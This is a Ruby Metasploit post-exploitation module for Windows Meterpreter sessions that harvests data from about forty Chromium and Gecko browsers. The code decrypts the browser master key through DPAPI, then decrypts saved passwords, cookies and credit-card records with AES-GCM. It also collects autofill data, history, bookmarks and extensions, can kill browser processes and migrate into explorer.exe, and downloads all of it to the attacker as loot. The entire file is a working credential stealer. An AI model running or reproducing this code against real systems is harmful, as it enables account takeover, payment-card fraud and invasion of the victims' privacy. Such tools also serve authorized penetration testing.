require 'sqlite3'

IV_SIZE = 12
TAG_SIZE = 16

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Advanced Browser Data Extraction for Chromium and Gecko Browsers',
        'Description' => %q{
          This post-exploitation module extracts sensitive browser data from both Chromium-based and Gecko-based browsers
          on the target system. It supports the decryption of passwords and cookies using Windows Data Protection API (DPAPI)
          and can extract additional data such as browsing history, keyword search history, download history, autofill data,
          credit card information and installed extensions.
        },
        'License' => MSF_LICENSE,
        'Platform' => ['win'],
        'Arch' => [ ARCH_X64, ARCH_X86 ],
        'Targets' => [['Windows', {}]],
        'SessionTypes' => ['meterpreter'],
        'Author' => ['Alexander "xaitax" Hagenah'],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      OptBool.new('KILL_BROWSER', [false, 'Kill browser processes before extracting data', false]),
      OptBool.new('USER_MIGRATION', [false, 'Migrate to explorer.exe running under user context before extraction', false]),
      OptEnum.new('BROWSER_TYPE', [true, 'Specify which browser type to extract data from', 'all', ['all', 'chromium', 'gecko']])
    ])
  end

  def run
    if session.type != 'meterpreter'
      print_error('This module requires a meterpreter session.')
      return
    end

    user_account = session.sys.config.getuid

    if user_account.downcase.include?('nt authority\\system')
      if datastore['USER_MIGRATION']
        migrate_to_explorer
      else
        print_error('Session is running with SYSTEM privileges. Enable USER_MIGRATION to run under a user context.')
        return
      end
    end

    sysinfo = session.sys.config.sysinfo
    os = sysinfo['OS']
    architecture = sysinfo['Architecture']
    language = sysinfo['System Language']
    computer = sysinfo['Computer']

    user_profile = get_env('USERPROFILE')
    user_account = session.sys.config.getuid
    ip_address = session.sock.peerhost

    if user_profile.nil? || user_profile.empty?
      print_error('Could not determine the current user profile directory.')
      return
    end

    print_status("Targeting: #{user_account} (IP: #{ip_address})")
    print_status("System Information: #{computer} | OS: #{os} | Arch: #{architecture} | Lang: #{language}")
    print_status("Starting data extraction from user profile: #{user_profile}")
    print_status('')

    case datastore['BROWSER_TYPE']
    when 'chromium'
      process_chromium_browsers(user_profile)
    when 'gecko'
      process_gecko_browsers(user_profile)
    else
      process_chromium_browsers(user_profile)
      process_gecko_browsers(user_profile)
    end
  end

  def migrate_to_explorer
    current_pid = session.sys.process.getpid
    explorer_process = session.sys.process.get_processes.find { |p| p['name'].downcase == 'explorer.exe' }

    if explorer_process
      explorer_pid = explorer_process['pid']
      if explorer_pid == current_pid
        print_status("Already running in explorer.exe (PID: #{explorer_pid}). No need to migrate.")
        return
      end

      print_status("Found explorer.exe running with PID: #{explorer_pid}. Attempting migration.")

      begin
        session.core.migrate(explorer_pid)
        print_good("Successfully migrated to explorer.exe (PID: #{explorer_pid}).")
      rescue Rex::Post::Meterpreter::RequestError => e
        print_error("Failed to migrate to explorer.exe (PID: #{explorer_pid}). Error: #{e.message}")
      end
    else
      print_error('explorer.exe process not found. Migration aborted.')
    end
  end

  # Browsers and paths taken from https://github.com/shaddy43/BrowserSnatch/
  def process_chromium_browsers(base_path)
    chromium_browsers = {
      'Microsoft\\Edge\\' => 'Microsoft Edge',
      'Google\\Chrome\\' => 'Google Chrome',
      'Opera Software\\Opera Stable' => 'Opera',
      'Iridium\\' => 'Iridium',
      'Chromium\\' => 'Chromium',
      'BraveSoftware\\Brave-Browser\\' => 'Brave',
      'CentBrowser\\' => 'CentBrowser',
      'Chedot\\' => 'Chedot',
      'Orbitum\\' => 'Orbitum',
      'Comodo\\Dragon\\' => 'Comodo Dragon',
      'Yandex\\YandexBrowser\\' => 'Yandex Browser',
      '7Star\\7Star\\' => '7Star',
      'Torch\\' => 'Torch',
      'MapleStudio\\ChromePlus\\' => 'ChromePlus',
      'Kometo\\' => 'Komet',
      'Amigo\\' => 'Amigo',
      'Sputnik\\Sputnik\\' => 'Sputnik',
      'CatalinaGroup\\Citrio\\' => 'Citrio',
      '360Chrome\\Chrome\\' => '360Chrome',
      'uCozMedia\\Uran\\' => 'Uran',
      'liebao\\' => 'Liebao',
      'Elements Browser\\' => 'Elements Browser',
      'Epic Privacy Browser\\' => 'Epic Privacy Browser',
      'CocCoc\\Browser\\' => 'CocCoc Browser',
      'Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer' => 'Sleipnir',
      'QIP Surf\\' => 'QIP Surf',
      'Coowon\\Coowon\\' => 'Coowon',
      'Vivaldi\\' => 'Vivaldi'
    }

    chromium_browsers.each do |path, name|
      profile_path = "#{base_path}\\AppData\\Local\\#{path}\\User Data\\Default"
      next unless directory?(profile_path)

      browser_version = get_chromium_version("#{base_path}\\AppData\\Local\\#{path}\\User Data\\Last Version")
      print_status("Found #{name}#{browser_version ? " (Version: #{browser_version})" : ''}")
      kill_browser_process(name) if datastore['KILL_BROWSER']

      local_state = "#{base_path}\\AppData\\Local\\#{path}\\User Data\\Local State"
      encryption_key = get_chromium_encryption_key(local_state)
      extract_chromium_data(profile_path, encryption_key, name)
    end
  end

  def get_chromium_version(last_version_path)
    return nil unless file?(last_version_path)

    version = read_file(last_version_path).strip
    return version unless version.empty?

    nil
  end

  # Browsers and paths taken from https://github.com/shaddy43/BrowserSnatch/
  def process_gecko_browsers(base_path)
    gecko_browsers = {
      'Mozilla\\Firefox\\' => 'Mozilla Firefox',
      'Thunderbird\\' => 'Thunderbird',
      'Mozilla\\SeaMonkey\\' => 'SeaMonkey',
      'NETGATE Technologies\\BlackHawk\\' => 'BlackHawk',
      '8pecxstudios\\Cyberfox\\' => 'Cyberfox',
      'K-Meleon\\' => 'K-Meleon',
      'Mozilla\\icecat\\' => 'Icecat',
      'Moonchild Productions\\Pale Moon\\' => 'Pale Moon',
      'Comodo\\IceDragon\\' => 'Comodo IceDragon',
      'Waterfox\\' => 'Waterfox',
      'Postbox\\' => 'Postbox',
      'Flock\\Browser\\' => 'Flock Browser'
    }

    gecko_browsers.each do |path, name|
      profile_path = "#{base_path}\\AppData\\Roaming\\#{path}\\Profiles"
      next unless directory?(profile_path)

      found_browser = false

      session.fs.dir.entries(profile_path).each do |profile_dir|
        next if profile_dir == '.' || profile_dir == '..'

        prefs_file = "#{profile_path}\\#{profile_dir}\\prefs.js"
        browser_version = get_gecko_version(prefs_file)

        if !found_browser
          print_status("Found #{name}#{browser_version ? " (Version: #{browser_version})" : ''}")
          found_browser = true
        end

        kill_browser_process(name) if datastore['KILL_BROWSER']

        extract_gecko_data("#{profile_path}\\#{profile_dir}", name)
      end
    end
  end

  def get_gecko_version(prefs_file)
    return nil unless file?(prefs_file)

    version_line = read_file(prefs_file).lines.find { |line| line.include?('extensions.lastAppVersion') }

    if version_line && version_line =~ /"extensions\.lastAppVersion",\s*"(\d+\.\d+\.\d+)"/
      return Regexp.last_match(1)
    end

    nil
  end

  def kill_browser_process(browser)
    browser_process_names = {
      'Microsoft Edge' => 'msedge.exe',
      'Google Chrome' => 'chrome.exe',
      'Opera' => 'opera.exe',
      'Iridium' => 'iridium.exe',
      'Chromium' => 'chromium.exe',
      'Brave' => 'brave.exe',
      'CentBrowser' => 'centbrowser.exe',
      'Chedot' => 'chedot.exe',
      'Orbitum' => 'orbitum.exe',
      'Comodo Dragon' => 'dragon.exe',
      'Yandex Browser' => 'browser.exe',
      '7Star' => '7star.exe',
      'Torch' => 'torch.exe',
      'ChromePlus' => 'chromeplus.exe',
      'Komet' => 'komet.exe',
      'Amigo' => 'amigo.exe',
      'Sputnik' => 'sputnik.exe',
      'Citrio' => 'citrio.exe',
      '360Chrome' => '360chrome.exe',
      'Uran' => 'uran.exe',
      'Liebao' => 'liebao.exe',
      'Elements Browser' =>
      'elementsbrowser.exe',
      'Epic Privacy Browser' => 'epic.exe',
      'CocCoc Browser' => 'browser.exe',
      'Sleipnir' => 'sleipnir.exe',
      'QIP Surf' => 'qipsurf.exe',
      'Coowon' => 'coowon.exe',
      'Vivaldi' => 'vivaldi.exe'
    }

    process_name = browser_process_names[browser]
    return unless process_name

    session.sys.process.get_processes.each do |process|
      next unless process['name'].downcase == process_name.downcase

      begin
        session.sys.process.kill(process['pid'])
      rescue Rex::Post::Meterpreter::RequestError
        next
      end
    end

    sleep(5)
  end

  def decrypt_chromium_data(encrypted_data)
    print_status('Starting DPAPI decryption process.') if datastore['VERBOSE']
    begin
      mem = session.railgun.kernel32.LocalAlloc(0, encrypted_data.length)['return']
      raise 'Memory allocation failed.' if mem == 0

      session.railgun.memwrite(mem, encrypted_data)

      if session.arch == ARCH_X86
        inout_fmt = 'V2'
      elsif session.arch == ARCH_X64
        inout_fmt = 'Q2'
      else
        fail_with(Failure::NoTarget, "Unsupported architecture: #{session.arch}")
      end

      pdatain = [encrypted_data.length, mem].pack(inout_fmt)
      ret = session.railgun.crypt32.CryptUnprotectData(
        pdatain, nil, nil, nil, nil, 0, 2048
      )
      len, addr = ret['pDataOut'].unpack(inout_fmt)
      decrypted_data = len == 0 ? nil : session.railgun.memread(addr, len)

      session.railgun.kernel32.LocalFree(mem)
      session.railgun.kernel32.LocalFree(addr) if addr != 0
      print_good('Decryption successful.') if datastore['VERBOSE']
      return decrypted_data.strip
    rescue StandardError => e
      print_error("Error during DPAPI decryption: #{e.message}")
      return nil
    end
  end

  def get_chromium_encryption_key(local_state_path)
    print_status("Getting encryption key from: #{local_state_path}") if datastore['VERBOSE']
    if file?(local_state_path)
      local_state = read_file(local_state_path)
      json_state = begin
        JSON.parse(local_state)
      rescue StandardError
        nil
      end
      if json_state.nil?
        print_error('Failed to parse JSON from Local State file.')
        return nil
      end

      if json_state['os_crypt'] && json_state['os_crypt']['encrypted_key']
        encrypted_key = json_state['os_crypt']['encrypted_key']
        encrypted_key_bin = begin
          Rex::Text.decode_base64(encrypted_key)[5..]
        rescue StandardError
          nil
        end
        if encrypted_key_bin.nil?
          print_error('Failed to Base64 decode the encrypted key.')
          return nil
        end

        print_status("Encrypted key (Base64-decoded, hex): #{encrypted_key_bin.unpack('H*').first}") if datastore['VERBOSE']
        decrypted_key = decrypt_chromium_data(encrypted_key_bin)

        if decrypted_key.nil? || decrypted_key.length != 32
          print_error("Decrypted key is not 32 bytes: #{decrypted_key.nil? ? 'nil' : decrypted_key.length} bytes") if datastore['VERBOSE']
          if decrypted_key.length == 31
            print_status('Decrypted key is 31 bytes, attempting to pad key for decryption.') if datastore['VERBOSE']
            decrypted_key += "\x00"
          else
            return nil
          end
        end
        print_good("Decrypted key (hex): #{decrypted_key.unpack('H*').first}") if datastore['VERBOSE']
        return decrypted_key
      else
        print_error('os_crypt or encrypted_key not found in Local State.')
        return nil
      end
    else
      print_error("Local State file not found at: #{local_state_path}")
      return nil
    end
  end

  def decrypt_chromium_password(encrypted_password, key)
    # Check for the "v20" prefix that indicates App-Bound encryption, which can't be decrypted yet.
    # https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html
    if encrypted_password[0, 3] == 'v20'
      print_status('App-Bound encryption detected (v20). Skipping decryption for this entry.') if datastore['VERBOSE']
      return nil
    end

    if encrypted_password.nil? || encrypted_password.length < (IV_SIZE + TAG_SIZE + 3)
      print_error('Invalid encrypted password length.')
      return nil
    end

    iv = encrypted_password[3, IV_SIZE]
    ciphertext = encrypted_password[IV_SIZE + 3...-TAG_SIZE]
    tag = encrypted_password[-TAG_SIZE..]

    if iv.nil? || iv.length != IV_SIZE
      print_error("Invalid IV: expected #{IV_SIZE} bytes, got #{iv.nil? ? 'nil' : iv.length} bytes")
      return nil
    end

    begin
      aes = OpenSSL::Cipher.new('aes-256-gcm')
      aes.decrypt
      aes.key = key
      aes.iv = iv
      aes.auth_tag = tag
      decrypted_password = aes.update(ciphertext) + aes.final
      return decrypted_password
    rescue OpenSSL::Cipher::CipherError
      print_status('Password decryption failed for this entry.') if datastore['VERBOSE']
      return nil
    end
  end

  def extract_chromium_data(profile_path, encryption_key, browser)
    return print_error("Profile path #{profile_path} not found.") unless directory?(profile_path)

    process_chromium_logins(profile_path, encryption_key, browser)
    process_chromium_cookies(profile_path, encryption_key, browser)
    process_chromium_credit_cards(profile_path, encryption_key, browser)
    process_chromium_download_history(profile_path, browser)
    process_chromium_autofill_data(profile_path, browser)
    process_chromium_keyword_search_history(profile_path, browser)
    process_chromium_browsing_history(profile_path, browser)
    process_chromium_bookmarks(profile_path, browser)
    process_chromium_extensions(profile_path, browser)
  end

  def process_chromium_logins(profile_path, encryption_key, browser)
    login_data_path = "#{profile_path}\\Login Data"
    if file?(login_data_path)
      extract_sql_data(login_data_path, 'SELECT origin_url, username_value, password_value FROM logins', 'Passwords', browser, encryption_key)
    elsif datastore['VERBOSE']
      print_error("Passwords not found at #{login_data_path}")
    end
  end

  def process_chromium_cookies(profile_path, encryption_key, browser)
    cookies_path = "#{profile_path}\\Network\\Cookies"
    if file?(cookies_path)
      begin
        extract_sql_data(cookies_path, 'SELECT host_key, name, path, encrypted_value FROM cookies', 'Cookies', browser, encryption_key)
      rescue StandardError => e
        if e.message.include?('core_channel_open')
          print_error('└ Cannot access Cookies. File in use by another process.')
        else
          print_error("An error occurred while extracting cookies: #{e.message}")
        end
      end
    elsif datastore['VERBOSE']
      print_error("Cookies not found at #{cookies_path}")
    end
  end

  def process_chromium_credit_cards(profile_path, encryption_key, browser)
    credit_card_data_path = "#{profile_path}\\Web Data"
    if file?(credit_card_data_path)
      extract_sql_data(credit_card_data_path, 'SELECT * FROM credit_cards', 'Credit Cards', browser, encryption_key)
    elsif datastore['VERBOSE']
      print_error("Credit Cards not found at #{credit_card_data_path}")
    end
  end

  def process_chromium_download_history(profile_path, browser)
    download_history_path = "#{profile_path}\\History"
    if file?(download_history_path)
      extract_sql_data(download_history_path, 'SELECT * FROM downloads', 'Download History', browser)
    elsif datastore['VERBOSE']
      print_error("Download History not found at #{download_history_path}")
    end
  end

  def process_chromium_autofill_data(profile_path, browser)
    autofill_data_path = "#{profile_path}\\Web Data"
    if file?(autofill_data_path)
      extract_sql_data(autofill_data_path, 'SELECT * FROM autofill', 'Autofill Data', browser)
    elsif datastore['VERBOSE']
      print_error("Autofill data not found at #{autofill_data_path}")
    end
  end

  def process_chromium_keyword_search_history(profile_path, browser)
    keyword_search_history_path = "#{profile_path}\\History"
    if file?(keyword_search_history_path)
      extract_sql_data(keyword_search_history_path, 'SELECT term FROM keyword_search_terms', 'Keyword Search History', browser)
    elsif datastore['VERBOSE']
      print_error("Keyword Search History not found at #{keyword_search_history_path}")
    end
  end

  def process_chromium_browsing_history(profile_path, browser)
    browsing_history_path = "#{profile_path}\\History"
    if file?(browsing_history_path)
      extract_sql_data(browsing_history_path, 'SELECT url, title, visit_count, last_visit_time FROM urls', 'Browsing History', browser)
    elsif datastore['VERBOSE']
      print_error("Browsing History not found at #{browsing_history_path}")
    end
  end

  def process_chromium_bookmarks(profile_path, browser)
    bookmarks_path = "#{profile_path}\\Bookmarks"
    return unless file?(bookmarks_path)

    bookmarks_data = read_file(bookmarks_path)
    bookmarks_json = JSON.parse(bookmarks_data)

    bookmarks = []
    if bookmarks_json['roots']['bookmark_bar']
      traverse_and_collect_bookmarks(bookmarks_json['roots']['bookmark_bar'], bookmarks)
    end
    if bookmarks_json['roots']['other']
      traverse_and_collect_bookmarks(bookmarks_json['roots']['other'], bookmarks)
    end

    browser_clean = browser.gsub('\\', '_').chomp('_')
    timestamp = Time.now.strftime('%Y%m%d%H%M')
    ip = session.sock.peerhost

    if bookmarks.any?
      bookmark_entries = bookmarks.map { |bookmark| "#{bookmark[:name]}: #{bookmark[:url]}" }.join("\n")
      file_name = store_loot("#{browser_clean}_Bookmarks", 'text/plain', session, bookmark_entries, "#{timestamp}_#{ip}_#{browser_clean}_Bookmarks.txt", "#{browser_clean} Bookmarks")
      file_size = ::File.size(file_name)
      print_good("└ Extracted Bookmarks to #{file_name} (#{file_size} bytes)")
    end
  end

  def traverse_and_collect_bookmarks(bookmark_node, bookmarks)
    if bookmark_node['children']
      bookmark_node['children'].each do |child|
        if child['type'] == 'url'
          bookmarks << { name: child['name'], url: child['url'] }
        elsif child['type'] == 'folder' && child['children']
          traverse_and_collect_bookmarks(child, bookmarks)
        end
      end
    end
  end

  def process_chromium_extensions(profile_path, browser)
    extensions_dir = "#{profile_path}\\Extensions\\"
    return unless directory?(extensions_dir)

    extension_data = ''
    session.fs.dir.entries(extensions_dir).each do |extension_id|
      extension_path = "#{extensions_dir}\\#{extension_id}"
      next unless directory?(extension_path)

      session.fs.dir.entries(extension_path).each do |version_folder|
        next if version_folder == '.' || version_folder == '..'

        manifest_path = "#{extension_path}\\#{version_folder}\\manifest.json"
        next unless file?(manifest_path)

        manifest_data = read_file(manifest_path)
        manifest_json = JSON.parse(manifest_data)

        extension_name = manifest_json['name']
        extension_version = manifest_json['version']

        if extension_name.start_with?('__MSG_')
          extension_name = resolve_chromium_extension_name(extension_path, extension_name, version_folder)
        end

        extension_data += "Name: #{extension_name}\nVersion: #{extension_version}\n\n"
      end
    end

    unless extension_data.strip.empty?
      browser_clean = browser.gsub('\\', '_').chomp('_')
      timestamp = Time.now.strftime('%Y%m%d%H%M')
      ip = session.sock.peerhost

      file_name = store_loot("#{browser_clean}_Extensions", 'text/plain', session, extension_data, "#{timestamp}_#{ip}_#{browser_clean}_Extensions.txt", "#{browser_clean} Extensions")
      file_size = ::File.size(file_name)
      print_good("└ Extracted Extensions to #{file_name} (#{file_size} bytes)")
    end
  end

  def resolve_chromium_extension_name(extension_path, name_key, version_folder)
    resolved_key = name_key.gsub('__MSG_', '').gsub('__', '')

    locales_dir = "#{extension_path}\\#{version_folder}\\_locales"
    unless directory?(locales_dir)
      return name_key
    end

    english_messages_path = "#{locales_dir}\\en\\messages.json"
    if file?(english_messages_path)
      messages_data = read_file(english_messages_path)
      messages_json = JSON.parse(messages_data)

      messages_json.each do |key, value|
        if key.casecmp?(resolved_key) && value['message']
          return value['message']
        end
      end
      return name_key
    end

    session.fs.dir.entries(locales_dir).each do |locale_folder|
      next if locale_folder == '.' || locale_folder == '..' || locale_folder == 'en'

      messages_path = "#{locales_dir}\\#{locale_folder}\\messages.json"
      next unless file?(messages_path)

      messages_data = read_file(messages_path)
      messages_json = JSON.parse(messages_data)

      messages_json.each do |key, value|
        if key.casecmp?(resolved_key) && value['message']
          return value['message']
        end
      end
    end

    return name_key
  end

  def extract_gecko_data(profile_path, browser)
    process_gecko_logins(profile_path, browser)
    process_gecko_cookies(profile_path, browser)
    process_gecko_download_history(profile_path, browser)
    process_gecko_keyword_search_history(profile_path, browser)
    process_gecko_browsing_history(profile_path, browser)
    process_gecko_bookmarks(profile_path, browser)
    process_gecko_extensions(profile_path, browser)
  end

  def process_gecko_logins(profile_path, browser)
    logins_path = "#{profile_path}\\logins.json"
    return unless file?(logins_path)

    json_data = read_file(logins_path)
    browser_clean = browser.gsub('\\', '_').chomp('_')
    timestamp = Time.now.strftime('%Y%m%d%H%M')
    ip = session.sock.peerhost
    file_name = store_loot("#{browser_clean}_Passwords", 'application/json', session, json_data, "#{timestamp}_#{ip}_#{browser_clean}_Passwords.json", "#{browser_clean} Passwords")
    file_size = ::File.size(file_name)

    print_good("└ Extracted Passwords to #{file_name} (#{file_size} bytes)") if file_size > 2
  end

  def process_gecko_cookies(profile_path, browser)
    cookies_path = "#{profile_path}\\cookies.sqlite"
    if file?(cookies_path)
      extract_sql_data(cookies_path, 'SELECT host, name, path, value, expiry FROM moz_cookies', 'Cookies', browser)
    elsif datastore['VERBOSE']
      print_error("Cookies not found at #{cookies_path}")
    end
  end

  def process_gecko_download_history(profile_path, browser)
    download_history_path = "#{profile_path}\\places.sqlite"
    if file?(download_history_path)
      extract_sql_data(download_history_path, 'SELECT place_id, GROUP_CONCAT(content), url, dateAdded FROM (SELECT * FROM moz_annos INNER JOIN moz_places ON moz_annos.place_id=moz_places.id) t GROUP BY place_id', 'Download History', browser)
    elsif datastore['VERBOSE']
      print_error("Download History not found at #{download_history_path}")
    end
  end

  def process_gecko_keyword_search_history(profile_path, browser)
    keyword_search_history_path = "#{profile_path}\\formhistory.sqlite"
    if file?(keyword_search_history_path)
      extract_sql_data(keyword_search_history_path, 'SELECT value FROM moz_formhistory', 'Keyword Search History', browser)
    elsif datastore['VERBOSE']
      print_error("Keyword Search History not found at #{keyword_search_history_path}")
    end
  end

  def process_gecko_browsing_history(profile_path, browser)
    browsing_history_path = "#{profile_path}\\places.sqlite"
    if file?(browsing_history_path)
      extract_sql_data(browsing_history_path, 'SELECT url, title, visit_count, last_visit_date FROM moz_places', 'Browsing History', browser)
    elsif datastore['VERBOSE']
      print_error("Browsing History not found at #{browsing_history_path}")
    end
  end

  def process_gecko_bookmarks(profile_path, browser)
    bookmarks_path = "#{profile_path}\\places.sqlite"
    if file?(bookmarks_path)
      extract_sql_data(bookmarks_path, 'SELECT moz_bookmarks.title AS title, moz_places.url AS url FROM moz_bookmarks JOIN moz_places ON moz_bookmarks.fk = moz_places.id', 'Bookmarks', browser)
    elsif datastore['VERBOSE']
      print_error("Bookmarks not found at #{bookmarks_path}")
    end
  end

  def process_gecko_extensions(profile_path, browser)
    addons_path = "#{profile_path}\\addons.json"
    return unless file?(addons_path)

    addons_data = read_file(addons_path)
    addons_json = JSON.parse(addons_data)

    extension_data = ''

    if addons_json['addons']
      addons_json['addons'].each do |addon|
        extension_name = addon['name']
        extension_version = addon['version']

        extension_data += "Name: #{extension_name}\nVersion: #{extension_version}\n\n"
      end
    end

    unless extension_data.strip.empty?
      browser_clean = browser.gsub('\\', '_').chomp('_')
      timestamp = Time.now.strftime('%Y%m%d%H%M')
      ip = session.sock.peerhost

      file_name = store_loot("#{browser_clean}_Extensions", 'text/plain', session, extension_data, "#{timestamp}_#{ip}_#{browser_clean}_Extensions.txt", "#{browser_clean} Extensions")
      file_size = ::File.size(file_name)
      print_good("└ Extracted Extensions to #{file_name} (#{file_size} bytes)")
    end
  end

  def extract_sql_data(db_path, query, data_type, browser, encryption_key = nil)
    if file?(db_path)
      db_local_path = "#{Rex::Text.rand_text_alpha(8, 12)}.db"
      session.fs.file.download_file(db_local_path, db_path)

      begin
        db = SQLite3::Database.open(db_local_path)
        result = db.execute(query)

        if encryption_key
          result.each do |row|
            next unless row[-1]

            if data_type == 'Cookies' && row[-1].length >= (IV_SIZE + TAG_SIZE + 3)
              row[-1] = decrypt_chromium_password(row[-1], encryption_key)
            elsif data_type == 'Passwords' && row[2].length >= (IV_SIZE + TAG_SIZE + 3)
              row[2] = decrypt_chromium_password(row[2], encryption_key)
            end
          end
        end

        browser_clean = browser.gsub('\\', '_').chomp('_')
        timestamp = Time.now.strftime('%Y%m%d%H%M')
        ip = session.sock.peerhost
        file_name = store_loot("#{browser_clean}_#{data_type}", 'text/plain', session, result, "#{timestamp}_#{ip}_#{browser_clean}_#{data_type}.txt", "#{browser_clean} #{data_type.capitalize}")
        file_size = ::File.size(file_name)

        if file_size > 2
          print_good("└ Extracted #{data_type.capitalize} to #{file_name} (#{file_size} bytes)")
        end
      ensure
        db.close
        ::File.delete(db_local_path) if ::File.exist?(db_local_path)
      end
    end
  end

end
